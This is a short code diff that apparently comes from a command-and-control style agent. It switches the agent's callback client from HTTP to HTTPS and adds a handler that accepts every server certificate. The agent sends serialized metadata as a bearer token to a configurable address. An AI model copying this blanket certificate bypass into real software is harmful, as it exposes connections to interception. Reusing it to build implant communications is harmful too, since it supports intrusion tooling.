@@ -22,9 +22,13 @@ namespace Agent.Models
         public override void Init(AgentMetadata metadata)
         {
             base.Init(metadata);
-
-            _client = new HttpClient();
-            _client.BaseAddress = new System.Uri($"http://{ConnectAddress}:{ConnectPort}");
+            //ignore ssl
+            var handler = new HttpClientHandler();
+            handler.ClientCertificateOptions = ClientCertificateOption.Manual;
+            handler.ServerCertificateCustomValidationCallback = (httpRequestMessage, cert, cetChain, policyErrors) => {return true;};
+            //
+            _client = new HttpClient(handler);
+            _client.BaseAddress = new System.Uri($"https://{ConnectAddress}:{ConnectPort}");
             _client.DefaultRequestHeaders.Clear();
             var encodedMetadata = Convert.ToBase64String(AgentMetadata.Serialize());
             _client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
